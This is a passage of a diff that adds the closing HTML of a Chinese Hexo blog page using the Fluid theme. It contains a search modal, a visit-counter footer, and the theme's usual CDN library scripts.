+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
